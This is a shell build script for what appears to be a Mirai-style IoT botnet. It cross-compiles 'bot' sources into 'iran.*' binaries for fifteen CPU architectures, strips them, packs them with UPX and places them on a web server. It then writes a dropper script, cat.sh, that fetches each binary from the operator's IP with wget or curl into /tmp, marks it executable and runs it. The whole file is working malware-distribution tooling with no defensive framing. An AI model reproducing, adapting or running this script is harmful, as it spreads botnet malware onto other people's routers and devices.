#!/bin/sh
export PATH=/etc/xcompile/x86_64/bin:/etc/xcompile/powerpc/bin:/etc/xcompile/mips/bin:/etc/xcompile/mipsel/bin:/etc/xcompile/armv4l/bin:/etc/xcompile/armv5l/bin:/etc/xcompile/armv6l/bin:/etc/xcompile/armv7l/bin:/etc/xcompile/sh4/bin:/etc/xcompile/arc/bin:/etc/xcompile/csky-gcc/bin:/etc/xcompile/aarch64/bin:/etc/xcompile/m68k/bin:/etc/xcompile/sparc/bin:/etc/xcompile/i486/bin:$PATH


cd bot

# Build for each arch
powerpc-gcc *.c -o iran.powerpc -DARCH_powerpc -lpthread -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -std=c99 -static
mips-gcc *.c -o iran.mips -DARCH_mips -lpthread -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -std=c99 -static
mips-gcc *.c -o iran.mipsrouter -DKILLER_OFF -DARCH_mipsrouter -lpthread -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -std=c99 -static
mipsel-gcc *.c -o iran.mipsel -DARCH_mipsel -lpthread -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -std=c99 -static
x86_64-gcc *.c -o iran.x86_64 -fno-stack-protector -fno-ident -fno-asynchronous-unwind-tables -DARCH_x86_64 -lpthread -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -s -std=c99 -static
m68k-gcc *.c -o iran.m68k -DARCH_m68k -lpthread -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -std=c99 -static
sparc-gcc *.c -o iran.sparc -DARCH_sparc -lpthread -O3 -fomit-frame-pointer -fdata-sections -std=c99 -static-libgcc
i486-gcc *.c -o iran.i486 -DARCH_i486 -lpthread -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -std=c99 -static
aarch64-linux-gnu-gcc *.c -o iran.aarch64 -fno-stack-protector -fno-ident -fno-asynchronous-unwind-tables -DARCH_aarch64 -pthread -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -std=c99 -static
armv4l-gcc *.c -o iran.armv4l -fno-stack-protector -fno-ident -fno-asynchronous-unwind-tables -DARCH_armv4l -lpthread -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -std=c99 -static
armv5l-gcc *.c -o iran.armv5l -fno-stack-protector -fno-ident -fno-asynchronous-unwind-tables -DARCH_armv5l -lpthread -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -std=c99 -static
armv6l-gcc *.c -o iran.armv6l -fno-stack-protector -fno-ident -fno-asynchronous-unwind-tables -DARCH_armv6l -lpthread -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -std=c99 -static
armv7l-gcc *.c -o iran.armv7l -fno-stack-protector -fno-ident -fno-asynchronous-unwind-tables -DARCH_armv7l -lpthread -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -std=c99 -static
sh4-gcc *.c -o iran.sh4 -DARCH_sh4 -lpthread -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -s -std=c99 -static
arc-linux-gcc *.c -o iran.arc -DARCH_arc -lpthread -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -std=c99 -static

# strip bins
powerpc-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr iran.powerpc
mips-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr iran.mips
mipsel-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr iran.mipsel
i486-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr iran.i486
x86_64-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr iran.x86_64
m68k-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr iran.m68k
sparc-strip -S --strip-unneeded iran.sparc
aarch64-linux-gnu-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr iran.aarch64
armv4l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr iran.armv4l
armv5l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr iran.armv5l
armv6l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr iran.armv6l
armv7l-strip -S --strip-unneeded -R .comment -R .note -R .note.gnu.build-id -R .note.gnu.gold-version iran.armv7l
sh4-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr iran.sh4
arc-linux-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr iran.arc

# compress — `|| true` prevents the build from failing if upx doesn't support the arch
upx --lzma iran.x86_64    || true
upx --lzma iran.aarch64   || true
upx --lzma iran.armv7l    || true
upx --lzma iran.armv6l    || true
upx --lzma iran.armv5l    || true
upx --lzma iran.armv4l    || true
upx --lzma iran.mips      || true
upx --lzma iran.mipsel    || true
upx --lzma iran.mipsrouter || true
upx --lzma iran.i486      || true
upx --lzma iran.powerpc   || true
upx --lzma iran.sh4       || true
upx --lzma iran.m68k      || true
upx --lzma iran.sparc     || true
upx --lzma iran.arc       || true

# Move binaries to web dir
mv iran.* /var/www/html

cd ..

IP=$(curl -s ifconfig.co 2>/dev/null || wget -qO- ifconfig.co)
cat <<EOF >/var/www/html/cat.sh
#!/bin/sh
# t.me/keepspin
cd /tmp || cd /var/run || cd /mnt || cd /root || exit 1
ARCHS="x86_64 aarch64 armv7l armv6l armv5l armv4l mips mipsel mipsrouter i486 powerpc sh4 m68k sparc arc"
for arch in \$ARCHS; do
    wget -q -O iran.\$arch http://$IP/iran.\$arch 2>/dev/null || \
    curl -s   -o iran.\$arch http://$IP/iran.\$arch 2>/dev/null || continue
    chmod +x iran.\$arch
    ./iran.\$arch "\$@" && break
done
EOF
chmod +x /var/www/html/cat.sh

echo "DONE!"

exit 0
